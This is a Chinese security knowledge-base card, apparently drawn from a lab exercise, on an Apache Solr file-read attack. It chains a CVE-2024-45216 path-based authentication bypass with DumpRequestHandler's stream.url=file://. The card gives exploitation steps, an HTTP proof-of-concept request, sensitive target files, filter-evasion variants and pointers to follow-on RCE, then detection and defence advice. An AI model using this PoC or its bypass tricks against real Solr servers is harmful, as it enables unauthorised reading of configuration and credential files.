---
id: web-java-component-solr-dumprequesthandler-file-read
title: Apache Solr DumpRequestHandler stream.url=file:// 任意文件读取（CVE-2024-45216 认证绕过路径）
type: scenario
domain: web
path: web/java/component
technique: solr-dumprequesthandler-file-url-read
tags:
- solr
- java
- cve-2024-45216
- arbitrary-file-read
- auth-bypass
- file-url
cve:
- CVE-2024-45216
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V254
  verified_at: '2026-11-07T16:03:21+08:00'
  notes: 已对照原文与16张图片逐项核对：请求路径\debug\dump;C:\Program Files\Git\admin\info\key、stream.url=file;\\flag.txt、SolrAuth头、DumpRequestHandler响应与文章一致；原文未给出CVE-2024-45216官方受影响版本区间，Solr 8.2.0仅为靶场环境版本，卡片已注明不据此认定官方范围
url: /docs/web/java/component/web-java-component-solr-dumprequesthandler-file-read/
draft: false
kb_aliases:
- Solr 任意文件读取
- CVE-2024-45216
- stream.url=file
- DumpRequestHandler
- SolrAuth
- /debug/dump
---

## 一句话结论

Apache Solr 的 DumpRequestHandler 调试端点会把 `stream.url` 参数当作 URL 打开并回显内容；攻击者用 `file:///flag.txt` 即可读取 Solr 进程可读的任意文件。文章按 CVE-2024-45216 的 `:/admin/info/key` 路径处理让请求到达 `/debug/dump` 并携带 `SolrAuth: test` 完成认证，目标环境为 Solr 8.2.0。

## 原理

- **DumpRequestHandler 是调试 handler**：Solr 的 `/solr/<core>/debug/dump` 用于把请求参数、流内容等转储到响应，支持 `stream.url`/`stream.body` 等参数；`stream.url` 会由服务端按 URL 打开并把内容放进 `streams[].stream` 返回。
- **file:// 协议**：Java 的 URL 流支持 `file://`，只要 Solr 进程对目标文件有读权限，`stream.url=file:///flag.txt` 就会读取本地文件；Windows 下用 `file:///C:/Windows/win.ini` 形式。
- **认证/路由差异**：文章的请求路径为 `/solr/cslab/debug/dump:/admin/info/key`，在 `/debug/dump` 后追加 `:/admin/info/key`。Solr 的路径/认证组件与最终 handler 路由对 `:` 段处理不一致，是 CVE-2024-45216 认证绕过路径的关键；请求同时带 `SolrAuth: test`（目标环境使用的认证头值），最终仍由 DumpRequestHandler 处理并返回文件内容。
- **为什么成立**：文件读取能力来自“调试 handler + 用户可控 URL”这一合法功能组合；认证绕过来自路径解析差异；两者叠加使未授权/低权限访问者能读服务器文件。若目标使用标准 BasicAuth 或其他认证，`SolrAuth` 头需按环境替换，或依赖对应的认证绕过条件。
- **版本说明**：文章环境为 Solr 8.2.0（core 状态显示 `C:\solr-8.2.0`）；CVE-2024-45216 的官方影响范围与修复版本应以厂商 advisory 为准，本卡不把 8.2.0 直接当作官方受影响区间。

## 触发条件

- 目标运行 Apache Solr，`/solr/<core>/debug/dump` handler 未被移除/禁用。
- DumpRequestHandler 的 `stream.url` 参数可用，且 `file://` URL 未被过滤；Solr 进程对目标文件有读权限。
- 认证可通过环境已知的 `SolrAuth` 头、弱凭据或 CVE-2024-45216 的路径处理绕过满足。
- 攻击者能访问 Solr HTTP 端口（常见 8983，靶场也可能映射到 80）。

## 利用步骤

1. 访问 `/solr/` 或 `/solr/admin/cores` 获取 core 名称（文章为 `cslab`）。
2. 构造 `POST /solr/<core>/debug/dump:/admin/info/key?param=ContentStreams&stream.url=file:///flag.txt`，按目标认证方式添加 `SolrAuth`（或 BasicAuth）头。
3. 从响应 JSON 的 `streams[]` 中读取 `stream` 字段，即为文件内容；若为空，检查 `sourceInfo`/`contentType` 与路径是否正确。
4. Windows 目标尝试 `file:///C:/Windows/win.ini`、`file:///C:/solr-8.2.0/server/solr/<core>/conf/solrconfig.xml` 等路径，读取配置/凭据/flag。
5. 读取到 Solr 配置或认证信息后，可进一步尝试 Config API 修改（如启用 VelocityResponseWriter）或读取系统敏感文件。

## PoC

```http
POST /solr/cslab/debug/dump:/admin/info/key?param=ContentStreams&stream.url=file:///flag.txt HTTP/1.1
Host: target
SolrAuth: test
Content-Type: application/json
Content-Length: 0
```

响应片段：

```json
{
  "responseHeader": {"status": 0, "handler": "org.apache.solr.handler.DumpRequestHandler"},
  "streams": [
    {"name": null, "sourceInfo": "url", "contentType": null, "stream": "<file contents>"}
  ]
}
```

## 变体与关联

- 变体：`stream.url` 指向 `file:///C:/...`、`file:///etc/passwd`、Solr 的 `solrconfig.xml`、`security.json`、日志文件；也可尝试 `jar:`/`http:` 等 URL 做 SSRF/读取。
- 变体：若 `stream.url` 被过滤，尝试大小写/编码、`stream.body`、其他 dump handler 参数或同名 handler 的其他路径。
- 关联：[[web-java-component-solr-velocityresponsewriter-config-rce]]（同一 Solr 目标的下一步 RCE）、[[web-java-component-solr-cve-2017-12629-xxe-runexecutablelistener-rce]]（另一种 Solr handler/Config API 组合 RCE）。
- 边界：目标移除 DumpRequestHandler、禁用 `file://`、严格认证且无可绕过路径、Solr 进程无目标文件读权限时，该链不成立。

## 检测与防御

- 检测：访问 `/debug/dump` 且带 `stream.url` 的请求；`stream.url` 含 `file://`、`jar:`、内网 URL；响应 `handler` 为 DumpRequestHandler 且返回文件内容；异常的 `:/` 路径段与认证头。
- 防御：生产环境移除/禁用 DumpRequestHandler 与调试 handler；升级 Solr 到修复 CVE-2024-45216 的版本；启用强认证并修复路径解析差异；限制 `file://`/URL 流；Solr 以最小权限运行，避免可读敏感文件；监控 `solrconfig.xml` 与 handler 配置变更。
